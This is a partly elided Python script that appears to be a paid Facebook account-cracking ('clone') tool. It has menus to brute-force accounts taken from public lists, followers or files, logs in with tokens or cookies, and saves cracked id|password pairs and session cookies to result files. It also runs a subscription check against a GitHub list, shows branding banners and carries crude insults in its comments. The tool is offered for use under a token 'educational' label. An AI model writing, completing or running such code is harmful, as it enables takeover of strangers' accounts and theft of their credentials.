...
try:
	...
	time.sleep(3)
	rq = requests.get('https://github.com/ONUEGBE1/ZULU/blob/main/Approval.txt').text
except requests.exceptions.ConnectionError:
	exit('\n[+] Server Is Ofline Try Again later\n')
...
\x1b[1;92m[➤➤➤➤]\x1b[1;92mCREATOR: CHIGOZIEWORLDWIDE [1;97m)
\033[41m\033[1;37m 👹 UNDEFEATED 👹 \033[41m\033[1;37m\x1b[0m
        
    \033[47m\033[1;92m CHIGOZIEWORLDWIDE \033[41m\033[1;37m \x1b[0m\n"""
##########
#####approvel 
xox = platform.platform()[::-1].replace('.', '').replace('-', '').replace(' ', '').upper()
server = requests.get('https://github.com/ONUEGBE1/ZULU/blob/main/Approval.txt').text
def approv():
	os.system("clear")
	print(logo2)
	print(" ")
	...
	if xox in server:
		...
		print(logo2)
		print(" ")
		print("         \x1b[0;92m[+]  Your Subscription No Allow  [+] \033[1;97m")
		print("-----------------------------------------------------")
		print("\x1b[0;92m [+] Your Token : "+xox)
		print(" ")
		print(" [+] Copy Your ID Send To OWNER ")
		print(" ")
		input(" [+] Enter ")
...
\x1b[1;92m[➤➤➤➤]\x1b[1;92mCREATOR: CHIGOZIEWORLDWIDE(\x1b[1;924\x1b[1;97m)
\033[41m\033[1;37m 👹 UNDEFEATED 👹\033[41m\033[1;37m\x1b[0m
...
\x1b[1;92m[🔴🔴🔴🔴]\x1b[1;92mCREATOR: CHIGOZIEWORLDWIDE(\x1b[1;92\x1b[1;97m)
\x1b[1;92m[🔴🔴🔴🔴]\x1b[1;92mSTATUS: PREMIUM
\x1b[1;92m[🔴🔴🔴🔴]\x1b[1;92mPAID
\x1b[1;92m[🔴🔴🔴🔴]\x1b[1;92mVersion 5.0
\x1b[1;92m[🔴🔴🔴🔴]\x1b[1;92m This Tool Is For Educational Purpose
\x1b[1;92m[🔴🔴🔴🔴]\x1b[1;92mWarning Don't Copy My Script
\033[41m\033[1;37m👹 UNDEFEATED 👹\033[41m\033[1;37m\x1b[0m
          
    \033[47m\033[1;92m CHIGOZIEWORLDWIDE \033[41m\033[1;37\x1b[0m\n"""
...
try:
	...
	print (war+'UPDATED VERSION 2022.')
	time.sleep(1)
	ua = pilih([
...
def menu():
	...
	print(f"╰─────────╯")		
	print("╭──────────────────•")
	print("├─[%s01%s] CLONE From public(multi)"%(O,K))
	print("├─[%s02%s] CLONE From followers"%(O,K))
	print("├─[%s03%s] CLONE From Files"%(O,K))	
	print("├─[%s04%s] Options Detect"%(O,K))	
                ...
                if log.get("status")=="cp":
                    ...
                    if opsii == "y" or "y" == opsii:
                       try:
                        ...
                        print("\r%s[%sCHIGOZIE OK%s]%s %s|%s|%s%s              "%(Q,I,Q,I,fl.get("id"),i,koki(log.get("cookies")),Q));play_mpv('assalamualaikum.mp3')
                        self.ok.append("%s|%s"%(fl.get("id"),i))
                        open("Hasil/OK-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                        bokep_japan_yang_terbaru("OK", fl.get("id"), i, "+")
                        break
                ...
                if log.get("status")=="cp":
                    ...
                    if opsii == "y" or "y" == opsii:
                       try:
                        ...
                        print("\r%s[%sCHIGOZIE OK%s]%s %s|%s|%s%s              "%(Q,I,Q,I,fl.get("id"),i,""),Q);play_mpv('assalamualaikum.mp3')
                        self.ok.append("%s|%s"%(fl.get("id"),i))
                        open("Hasil/OK-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                        bokep_japan_yang_terbaru("OK", fl.get("id"), i, "+")
                        break
...
def login():
	...
	print(f"     ╰────────────────────────────╯\n")	
	print ("├─[%s01%s] Login Token"%(O,K))
	print ("├─[%s02%s] Login Cookies"%(O,K))
	print("╰──────────•\n")
...
def cek_tgl():  # CHECK TANGGAL KONTOL
	...
	try:
		...
		if "KIKY" in "":
			...
			infona = (Q+"├─["+C+"•"+Q+"]"+Q+" Premium : "+I+lim_dev_id+" Hari Lagi");os.popen('play-audio selamat.mp3')
			jalan(infona);time.sleep(2)
			return infona
...
if "ANAK KONTOL, SAMA AJA MACAM HAKIKI" == anak_hakiki_ajg:
	if len(sys.argv) == 2:
		if sys.argv[1] == 'apk':
			...
			exit(inp+"Type : python CORE.py (commend)")
	try:cek_tok_tok()
	except:pass
